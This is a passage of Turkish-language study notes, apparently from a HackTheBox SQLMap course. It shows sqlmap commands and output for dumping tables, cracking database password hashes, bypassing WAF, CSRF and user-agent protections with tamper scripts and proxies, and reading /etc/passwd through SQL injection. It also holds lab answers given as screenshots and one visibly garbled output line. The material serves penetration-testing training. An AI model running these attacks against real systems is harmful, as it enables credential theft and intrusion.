Bilinen bir WHERE koşuluna (örneğin name LIKE 'f%') dayalı olarak belirli satırların alınması gerekiyorsa, --where seçeneğini aşağıdaki gibi kullanabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```


## Full DB Enumeration

Belirli bir tabloyu baz alarak içerik çıkarmak yerine, `-T` seçeneğini kullanmadan (örneğin, `--dump -D testdb`) ilgi alanındaki veritabanındaki tüm tabloları çıkarabiliriz. Sadece `--dump` seçeneğini kullanarak ve `-T` ile bir tablo belirtmeden, mevcut veritabanının tüm içeriği alınır. `--dump-all` seçeneği ise tüm veritabanlarındaki içeriğin tamamını alır.

Bu tür durumlarda, kullanıcıya ayrıca `--exclude-sysdbs` seçeneğini eklemesi önerilir (örneğin, `--dump-all --exclude-sysdbs`). Bu seçenek, SQLMap'e sistem veritabanlarının içeriğini atlamasını söyler; çünkü bu veriler genellikle sızma testleri yapanlar için pek ilgi çekici değildir.


Soru : What's the contents of table flag1 in the testdb database? (Case #1)

Cevap : 

![Pasted image 20241215050917.png](/img/user/resimler/Pasted%20image%2020241215050917.png)

![Pasted image 20241215050928.png](/img/user/resimler/Pasted%20image%2020241215050928.png)
,




# Advanced Database Enumeration

SQLMap ile veritabanı numaralandırmanın temellerini ele aldığımıza göre, bu bölümde ilgilenilen verileri numaralandırmak için daha gelişmiş teknikleri ele alacağız.



## DB Schema Enumeration

Veritabanı mimarisine tam bir genel bakış elde edebilmek için tüm tabloların yapısını almak istersek --schema anahtarını kullanabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```


## Searching for Data

Çok sayıda tablo ve sütun içeren karmaşık veritabanı yapılarıyla uğraşırken, --search seçeneğini kullanarak ilgilendiğimiz veritabanlarını, tabloları ve sütunları arayabiliriz. Bu seçenek, LIKE operatörünü kullanarak tanımlayıcı adlarını aramamızı sağlar. Örneğin, user anahtar kelimesini içeren tüm tablo adlarını arıyorsak, SQLMap'i aşağıdaki gibi çalıştırabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user

...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n] 
...SNIP...
```

Yukarıdaki örnekte, bu arama sonuçlarına dayanarak birkaç ilginç veri alma hedefini hemen tespit edebiliriz. Belirli bir anahtar kelimeye (örn. pass) dayalı olarak tüm sütun adlarını aramayı da deneyebilirdik:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+
```


## Password Enumeration and Cracking

Parolaları içeren bir tablo belirledikten sonra (örn. master.users), daha önce gösterildiği gibi -T seçeneğiyle bu tabloyu alabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```
![Pasted image 20241215153106.png](/img/user/resimler/Pasted%20image%2020241215153106.png)

Önceki örnekte SQLMap'in otomatik parola hash kırma özelliğine sahip olduğunu görebiliyoruz. Bilinen bir hash formatına benzeyen herhangi bir değer alındığında, SQLMap bulunan hash'lere sözlük tabanlı bir saldırı gerçekleştirmemizi ister.

Hash kırma saldırıları, kullanıcının bilgisayarında bulunan core sayısına bağlı olarak çok işlemli bir şekilde gerçekleştirilir. Şu anda, 1,4 milyon giriş içeren bir sözlükle (halka açık parola sızıntılarında görünen en yaygın girişlerle yıllar içinde derlenmiştir) 31 farklı hash algoritması türünü kırmak için uygulanmış bir destek vardır. Bu nedenle, bir parola hash'i rastgele seçilmemişse, SQLMap'in bunu otomatik olarak kırma olasılığı yüksektir.


## DB Users Password Enumeration and Cracking

DB tablolarında bulunan kullanıcı kimlik bilgilerinin yanı sıra, veritabanına özgü kimlik bilgilerini (örneğin, bağlantı kimlik bilgileri) içeren sistem tablolarının içeriğini de dump etmeye çalışabiliriz. Tüm süreci kolaylaştırmak için SQLMap, özellikle böyle bir görev için tasarlanmış özel bir --passwords anahtarına sahiptir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch

...SNIP...
[14:25:20] [INFO] fetching database users password hashes
[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'debian-sys-maint'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y

[14:25:20] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:25:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:20] [INFO] starting 8 processes 
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass

[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 14:25:28 /2020-09-18/
```

İpucu: '--batch' anahtarı ile birlikte '--all' anahtarı, tüm numaralandırma işlemini hedefin kendisinde otomatik olarak yapacak ve tüm numaralandırma ayrıntılarını sağlayacaktır.

Bu temelde, erişilebilen her şeyin alınacağı ve potansiyel olarak çok uzun bir süre çalışacağı anlamına gelir. Çıktı dosyalarında ilgilendiğimiz verileri manuel olarak bulmamız gerekecektir.


Soru : Adında “style” geçen sütunun adı nedir? (Durum #1)
Cevap : 

![Pasted image 20241215162026.png](/img/user/resimler/Pasted%20image%2020241215162026.png)

![Pasted image 20241215162013.png](/img/user/resimler/Pasted%20image%2020241215162013.png)


Soru : Kimberly kullanıcısının şifresi nedir? (Durum #1)

Cevap : 

1- Veritabanlarını listele

![Pasted image 20241215162317.png](/img/user/resimler/Pasted%20image%2020241215162317.png)

2- Tabloları listele 

![Pasted image 20241215162353.png](/img/user/resimler/Pasted%20image%2020241215162353.png)


![Pasted image 20241215162426.png](/img/user/resimler/Pasted%20image%2020241215162426.png)

3- Kullanıcı tablosunun sütunlarını listele
![Pasted image 20241215162533.png](/img/user/resimler/Pasted%20image%2020241215162533.png)

![Pasted image 20241215162702.png](/img/user/resimler/Pasted%20image%2020241215162702.png)

![Pasted image 20241215165143.png](/img/user/resimler/Pasted%20image%2020241215165143.png)



### Bypassing Web Application Protections

İdeal bir senaryoda hedef tarafta herhangi bir koruma(lar) konuşlandırılmayacaktır, böylece otomatik istismar önlenemeyecektir. Aksi takdirde, böyle bir hedefe karşı herhangi bir tür otomatik araç çalıştırırken sorunlar bekleyebiliriz. Bununla birlikte, SQLMap'e bu tür korumaları başarıyla atlamamıza yardımcı olabilecek birçok mekanizma dahil edilmiştir.


### Anti-CSRF Token Bypass

Otomasyon araçlarının kullanımına karşı ilk savunma hatlarından biri, özellikle web formu doldurma sonucunda oluşturulan HTTP isteklerinde, tüm HTTP isteklerine anti-CSRF (yani, Cross-Site Request Forgery) token'larının eklenmesidir.

En basit ifadeyle, bu senaryoda her bir HTTP isteğinde, yalnızca kullanıcının gerçekten sayfayı ziyaret edip kullandığı durumlarda geçerli bir token değeri bulunmalıdır. Orijinal olarak bu fikir, kötü niyetli bağlantılarla oluşabilecek senaryoları (örneğin, yalnızca bağlantının açılmasıyla farkında olmayan oturum açmış kullanıcılar için istenmeyen sonuçlar doğurabilecek yönetici sayfalarını açma ve önceden tanımlanmış kimlik bilgileriyle yeni bir kullanıcı ekleme gibi) önlemek amacıyla geliştirilmişti. Ancak bu güvenlik özelliği, istem dışı otomasyona karşı da uygulamaları dolaylı olarak güçlendirmiştir.

Bununla birlikte, SQLMap anti-CSRF korumasını atlatmaya yardımcı olabilecek seçeneklere sahiptir. Bunlardan en önemlisi --csrf-token seçeneğidir. Token parametre adının belirtilmesiyle (sağlanan istek verileri içinde zaten mevcut olması gerekir), SQLMap otomatik olarak hedef yanıt içeriğini ayrıştırmaya çalışacak ve bir sonraki istekte kullanabilmek için yeni token değerlerini arayacaktır.

Ek olarak, kullanıcının --csrf-token aracılığıyla token adını açıkça belirtmediği bir durumda bile, sağlanan parametrelerden biri yaygın eklerden herhangi birini (yani csrf, xsrf, token) içeriyorsa, kullanıcıya daha sonraki isteklerde güncelleyip güncellemeyeceği sorulacaktır:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:18:01 /2020-09-18/

POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```


### Unique Value Bypass
Bazı durumlarda, web uygulaması yalnızca önceden tanımlanmış parametreler içinde benzersiz değerlerin sağlanmasını gerektirebilir. Böyle bir mekanizma, web sayfası içeriğini ayrıştırmaya gerek olmaması dışında yukarıda açıklanan CSRF önleme tekniğine benzer. Dolayısıyla, her isteğin önceden tanımlanmış bir parametre için benzersiz bir değere sahip olmasını sağlayarak, web uygulaması CSRF girişimlerini kolayca önleyebilir ve aynı zamanda bazı otomasyon araçlarının önüne geçebilir. Bunun için, gönderilmeden önce rastgele hale getirilmesi gereken bir değer içeren parametre adına işaret eden --randomize seçeneği kullanılmalıdır:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```


### Hesaplanan Parametre Bypass
Benzer bir başka mekanizma da bir web uygulamasının uygun bir parametre değerinin diğer bazı parametre değer(ler)ine göre hesaplanmasını beklediği durumdur. Çoğu zaman, bir parametre değerinin diğerinin mesaj özetini (örneğin h=MD5(id)) içermesi gerekir. Bunu atlamak için, --eval seçeneği kullanılmalıdır, burada istek hedefe gönderilmeden hemen önce geçerli bir Python kodu değerlendirilir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
```


### IP Adresi Gizleme

IP adresimizi gizlemek istiyorsak veya belirli bir web uygulaması mevcut IP adresimizi blacklistleyen bir koruma mekanizmasına sahipse, bir proxy veya anonimlik ağı Tor kullanmayı deneyebiliriz. Bir proxy, çalışan bir proxy eklememiz gereken --proxy seçeneğiyle (örneğin --proxy=“socks4://177.39.187.70:33283”) ayarlanabilir.

Buna ek olarak, elimizde bir proxy listesi varsa, bunları SQLMap'e --proxy-file seçeneği ile sağlayabiliriz. Bu şekilde, SQLMap listeden sırayla geçecek ve herhangi bir sorun olması durumunda (örneğin, IP adresinin blacklisting'i), sadece listeden bir sonrakine atlayacaktır. Diğer seçenek, IP'mizin Tor çıkış nodlarının geniş bir listesinden herhangi bir yerde görünebileceği, kullanımı kolay bir anonimleştirme sağlamak için Tor ağı kullanımıdır. Lokal makineye düzgün bir şekilde kurulduğunda, 9050 veya 9150 lokal portunda bir SOCKS4 proxy hizmeti olmalıdır. switch --tor kullanıldığında SQLMap otomatik olarak lokal portu bulmaya çalışacak ve uygun şekilde kullanacaktır.

Tor'un düzgün bir şekilde kullanıldığından emin olmak istiyorsak, istenmeyen davranışları önlemek için --check-tor anahtarını kullanabiliriz. Bu gibi durumlarda, SQLMap https://check.torproject.org/ adresine bağlanacak ve yanıtın amaçlanan sonucu verip vermediğini kontrol edecektir (yani, Congratulations içeride görünür).


## WAF Bypass

SQLMap'i her çalıştırdığımızda, ilk testlerin bir parçası olarak, SQLMap bir WAF'ın (Web Uygulaması Güvenlik Duvarı) varlığını test etmek için var olmayan bir parametre adı (örneğin ?pfov=...) kullanarak önceden tanımlanmış kötü amaçlı görünümlü bir payload gönderir. Kullanıcı ve hedef arasında herhangi bir koruma olması durumunda yanıtta orijinaline kıyasla önemli bir değişiklik olacaktır. Örneğin, en popüler WAF çözümlerinden biri (ModSecurity) uygulanıyorsa, böyle bir istekten sonra 406 - Kabul Edilemez yanıtı olmalıdır.

Pozitif bir tespit durumunda, gerçek koruma mekanizmasını tanımlamak için SQLMap, 80 farklı WAF çözümünün imzalarını içeren üçüncü taraf bir kütüphane olan identYwaf'ı kullanır. Bu sezgisel testi tamamen atlamak istersek (yani, daha az gürültü üretmek için), --skip-waf anahtarını kullanabiliriz.


## User-agent Blacklisting Bypass

SQLMap'i çalıştırırken ani sorunlar (örneğin, başlangıçtan itibaren HTTP hata kodu 5XX) olması durumunda, düşünmemiz gereken ilk şeylerden biri SQLMap tarafından kullanılan varsayılan kullanıcı aracısının potansiyel kara listeye alınmasıdır (örneğin, User-agent: sqlmap/1.4.9 (http://sqlmap.org)).

Bu, --random-agent seçeneği ile kolayca aşılabilir. Bu seçenek, varsayılan kullanıcı aracısını (user-agent) tarayıcılar tarafından kullanılan geniş bir havuzdan rastgele seçilen bir değerle değiştirir.

Not: Çalışma sırasında bir tür koruma tespit edilirse, hedefle, hatta diğer güvenlik mekanizmalarıyla ilgili sorunlar bekleyebiliriz. Bunun ana nedeni, bu tür korumalardaki sürekli gelişme ve yeni iyileştirmelerin saldırganlar için giderek daha küçük bir manevra alanı bırakmasıdır.


## Tamper Scripts

Son olarak, WAF/IPS çözümlerini atlamak için SQLMap'te uygulanan en popüler mekanizmalardan biri de “tamper” scriptleridir. Tamper komut dosyaları, çoğu durumda bazı korumaları atlamak için hedefe gönderilmeden hemen önce istekleri değiştirmek için yazılmış özel bir tür (Python) komut dosyalarıdır.

Örneğin, en popüler tamper komut dosyalarından biri, [büyüktür](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) operatörünün (>) tüm oluşumlarını NOT BETWEEN 0 AND # ile ve eşittir operatörünü (=) BETWEEN # AND # ile değiştirmektir. Bu şekilde, birçok ilkel koruma mekanizması (çoğunlukla XSS saldırılarını önlemeye odaklanmıştır), en azından SQLi amaçları için kolayca atlanabilir.

Tamper scriptleri, --tamper seçeneği içinde ardışık olarak zincirlenebilir (örneğin, --tamper=between,randomcase) ve önceden tanımlanmış öncelik sırasına göre çalıştırılır. Öncelik, istenmeyen davranışları önlemek için tanımlanmıştır; çünkü bazı scriptler, SQL sözdizimini değiştirerek payload'ları düzenler (örneğin, [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). Buna karşılık, bazı tamper scriptleri içeriğin detaylarıyla ilgilenmez (örneğin, [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).

*  **Birden fazla tamper scripti bir arada kullanılabilir**. Örneğin:

![Pasted image 20241215200811.png](/img/user/resimler/Pasted%20image%2020241215200811.png)

Bu komut, önce `between` scriptini, sonra `randomcase` scriptini çalıştırır.

### **Öncelik Sırası**

- Her tamper scriptinin bir **öncelik sırası** vardır. Bu öncelik sırası, bir scriptin diğerinden önce çalışmasını sağlar.
- Bu önemli bir özelliktir çünkü bazı tamper scriptleri, sorgunun yapısını büyük ölçüde değiştirir. Eğer bu sıraya dikkat edilmezse, sonuçlar yanlış olabilir veya sorgu çalışmayabilir.

### **Tamper Script Türleri**

1. **Sözdizimi Değiştiren Scriptler**:
    
    - SQL sorgusunun yapısını veya sözdizimini değiştirir.
    - Örnek: `ifnull2ifisnull`
        - Bu script, SQL sorgusundaki `IFNULL` fonksiyonlarını `IF(ISNULL(...))` şeklinde değiştirir.
2. **İçeriği Etkilemeyen Scriptler**:
    
    - SQL sorgusunun içeriğiyle ilgilenmez; daha çok sorguya küçük eklemeler yapar.
    - Örnek: `appendnullbyte`
        - Bu script, sorgunun sonuna bir NULL byte (`%00`) ekler. Bu, özellikle URL filtrelemeleri atlatmak için kullanılır.

### **Ne İşe Yarar?**

Tamper scriptleri, hedef sistemde aşağıdaki durumları aşmak için kullanılır:

- SQL filtreleme mekanizmaları.
- SQL sorgularını engelleyen güvenlik duvarları veya WAF'ler.
- Karakter sınırlamaları veya sözdizimi kısıtlamaları.


### **Basit Bir Örnek**

Hedef sistem, `SELECT` kelimesini içeren sorguları engelliyorsa:

- `randomcase` tamper scripti, sorgudaki harflerin büyük/küçük harf durumunu değiştirir:

![Pasted image 20241215200904.png](/img/user/resimler/Pasted%20image%2020241215200904.png)

Bu şekilde, filtrelemeyi atlatmak mümkün olabilir.


Tamper scriptleri, isteğin herhangi bir kısmını değiştirebilir, ancak çoğunluğu genellikle yük (payload) içeriğini değiştirir. En dikkat çekici tamper scriptleri şunlardır:

- **0eunion**: UNION ifadelerini e0UNION ile değiştirir.
- **base64encode**: Verilen yükteki tüm karakterleri Base64 formatında kodlar.
- **between**: Büyüktür operatörünü (>) `NOT BETWEEN 0 AND #` ile, eşittir operatörünü (=) `BETWEEN # AND #` ile değiştirir.
- **commalesslimit**: (MySQL) LIMIT M, N gibi ifadeleri `LIMIT N OFFSET M` karşılığıyla değiştirir.
- **equaltolike**: Eşittir operatörünü (=) `LIKE` ile değiştirir.
- **halfversionedmorekeywords**: Her anahtar kelimenin önüne (MySQL) versiyonlanmış bir yorum ekler.
- **modsecurityversioned**: Tüm sorguyu (MySQL) versiyonlanmış bir yorum ile sarar.
- **modsecurityzeroversioned**: Tüm sorguyu (MySQL) sıfır versiyonlu bir yorum ile sarar.
- **percentage**: Her karakterin önüne yüzde işareti (%) ekler (örneğin SELECT -> %S%E%L%E%C%T).
- **plus2concat**: Artı operatörünü (+) (MsSQL) CONCAT() fonksiyonu ile değiştirir.
- **randomcase**: Her anahtar kelimenin karakterini rastgele büyük/küçük harfe dönüştürür (örneğin SELECT -> SEleCt).
- **space2comment**: Boşluk karakterini ( ) `/` ile başlayan yorumlarla değiştirir.
- **space2dash**: Boşluk karakterini ( ), bir tire yorumu (--) ve rastgele bir dizi ardından yeni bir satır (\n) ile değiştirir.
- **space2hash**: (MySQL) Boşluk karakterini ( ), bir kare işareti (#) ve rastgele bir dizi ardından yeni bir satır (\n) ile değiştirir.
- **space2mssqlblank**: (MsSQL) Boşluk karakterini ( ), geçerli alternatif karakterlerden rastgele bir boşluk karakteri ile değiştirir.
- **space2plus**: Boşluk karakterini ( ) artı işareti (+) ile değiştirir.
- **space2randomblank**: Boşluk karakterini ( ), geçerli alternatif karakterlerden rastgele bir boşluk karakteri ile değiştirir.
- **symboliclogical**: AND ve OR mantıksal operatörlerini, sembolik karşılıkları olan `&&` ve `||` ile değiştirir.
- **versionedkeywords**: Her fonksiyon olmayan anahtar kelimeyi (MySQL) versiyonlanmış bir yorumla sarar.
- **versionedmorekeywords**: Her anahtar kelimeyi (MySQL) versiyonlanmış bir yorumla sarar.

Uygulanan tamper komut dosyalarının tam bir listesini almak için, yukarıdaki açıklamayla birlikte --list-tampers anahtarı kullanılabilir. Ayrıca, ikinci dereceden SQLi gibi herhangi bir özel saldırı türü için özel Tamper komut dosyaları geliştirebiliriz.


### **Çeşitli Atlama Mekanizmaları**  
Diğer koruma atlama mekanizmalarından bahsederken, iki yöntem daha öne çıkarılmalıdır. İlki, **Chunked transfer encoding** (parçalı transfer kodlaması) olup, `--chunked` seçeneği ile etkinleştirilir. Bu yöntem, POST isteğinin gövdesini "parçalar" olarak adlandırılan bölümlere ayırır. Kara listeye alınmış SQL anahtar kelimeleri, parçalar arasında bölünerek bu kelimeleri içeren isteklerin fark edilmeden geçmesini sağlar.

Diğer atlama mekanizması ise **HTTP parameter pollution (HPP)** (HTTP parametre kirliliği) yöntemidir. Bu yöntemde yükler, `--chunked` seçeneğinde olduğu gibi farklı ama aynı adı taşıyan parametrelerin değerleri arasında bölünür (örneğin: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`). Destekleyen platformlarda (örneğin ASP), bu parametreler hedef sistem tarafından birleştirilir ve isteğin işlenmesine olanak tanır.


Soru 1 : What's the contents of table flag8? (Case #8)

Cevap : 

![Pasted image 20241215202220.png](/img/user/resimler/Pasted%20image%2020241215202220.png)


![Pasted image 20241215202225.png](/img/user/resimler/Pasted%20image%2020241215202225.png)

![Pasted image 20241215202242.png](/img/user/resimler/Pasted%20image%2020241215202242.png)


Soru 2 :  What's the contents of table flag9? (Case #9)

Cevap : 

![Pasted image 20241216025604.png](/img/user/resimler/Pasted%20image%2020241216025604.png)

![Pasted image 20241216025534.png](/img/user/resimler/Pasted%20image%2020241216025534.png)

![Pasted image 20241216025515.png](/img/user/resimler/Pasted%20image%2020241216025515.png)


Soru 3 : What's the contents of table flag10? (Case #10)

Cevap :

![Pasted image 20241216030015.png](/img/user/resimler/Pasted%20image%2020241216030015.png)


![Pasted image 20241216025751.png](/img/user/resimler/Pasted%20image%2020241216025751.png)

![Pasted image 20241216030007.png](/img/user/resimler/Pasted%20image%2020241216030007.png)


Soru 4 : Tablo bayrağı11'in içeriği nedir? (Vaka #11)

Cevap : 

![Pasted image 20241216030731.png](/img/user/resimler/Pasted%20image%2020241216030731.png)

![Pasted image 20241216030659.png](/img/user/resimler/Pasted%20image%2020241216030659.png)

![Pasted image 20241216030720.png](/img/user/resimler/Pasted%20image%2020241216030720.png)

![Pasted image 20241216030704.png](/img/user/resimler/Pasted%20image%2020241216030704.png)
,



# OS Exploitation

SQLMap, lokal sistemden DBMS dışındaki dosyaları okumak ve yazmak için bir SQL Injection kullanma yeteneğine sahiptir. SQLMap ayrıca, uygun ayrıcalıklara sahip olmamız halinde remote hostta bize doğrudan komut çalıştırma imkanı da verebilir.


## File Read/Write

SQL Enjeksiyonu güvenlik açığı yoluyla İşletim Sistemi Exploitation'ın ilk kısmı, hosting sunucusundaki verileri okumak ve yazmaktır. Veri okumak, modern DBMS'lerde kesinlikle ayrıcalıklı olan veri yazmaktan çok daha yaygındır, çünkü göreceğimiz gibi sistem istismarına yol açabilir. Örneğin, MySql'de lokal dosyaları okumak için, DB kullanıcısının bir dosyanın içeriğini bir tabloya yükleyebilmesi ve ardından bu tabloyu okuyabilmesi için LOAD DATA ve INSERT ayrıcalıklarına sahip olması gerekir.

Böyle bir komutun örneği şudur:

- `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Verileri okumak için mutlaka veritabanı yöneticisi ayrıcalıklarına (DBA) sahip olmamız gerekmese de, modern VTYS'lerde bu daha yaygın hale gelmektedir. Aynı durum diğer yaygın veritabanları için de geçerlidir. Yine de, DBA ayrıcalıklarına sahipsek, dosya okuma ayrıcalıklarına sahip olmamız çok daha olasıdır.

## Checking for DBA Privileges

SQLMap ile DBA ayrıcalıklarına sahip olup olmadığımızı kontrol etmek için --is-dba seçeneğini kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:31:55 /2020-11-19/

[17:31:55] [INFO] resuming back-end DBMS 'mysql'
[17:31:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: False

[*] ending @ 17:31:56 /2020-11-19
```

Gördüğümüz gibi, bunu önceki alıştırmalardan birinde test edersek, geçerli kullanıcı DBA'dır: False, yani DBA erişimimiz yok. SQLMap kullanarak bir dosyayı okumaya çalışsaydık, şöyle bir şey elde ederdik:

```shell-session
[17:31:43] [INFO] fetching file: '/etc/passwd'
[17:31:43] [ERROR] no data retrieved
```

İşletim sistemi istismarını test etmek için, bu bölümün sonundaki sorularda görüldüğü gibi DBA ayrıcalıklarına sahip olduğumuz bir alıştırma deneyelim:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:37:47 /2020-11-19/

[17:37:47] [INFO] resuming back-end DBMS 'mysql'
[17:37:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: True

[*] ending @ 17:37:48 /2020-11-19/
```

Bu sefer geçerli kullanıcının DBA olduğunu görüyoruz: True, yani lokal dosyaları okuma ayrıcalığına sahip olabiliriz.


## Reading Local Files

SQLi aracılığıyla yukarıdaki satırı manuel olarak enjekte etmek yerine, SQLMap --file-read seçeneğiyle lokal dosyaları okumayı nispeten kolaylaştırır:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:40:00 /2020-11-19/

[17:40:00] [INFO] resuming back-end DBMS 'mysql'
[17:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[17:40:01] [INFO] fetching file: '/etc/passwd'
[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
[17:40:07] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y

[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)

[*] ending @ 17:40:14 /2020-11-19/
```

Gördüğümüz gibi, SQLMap dosyaların lokal bir dosyaya kaydedildiğini söyledi. İçeriğini görmek için lokal dosyayı tarayabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```


## Writing Local Files

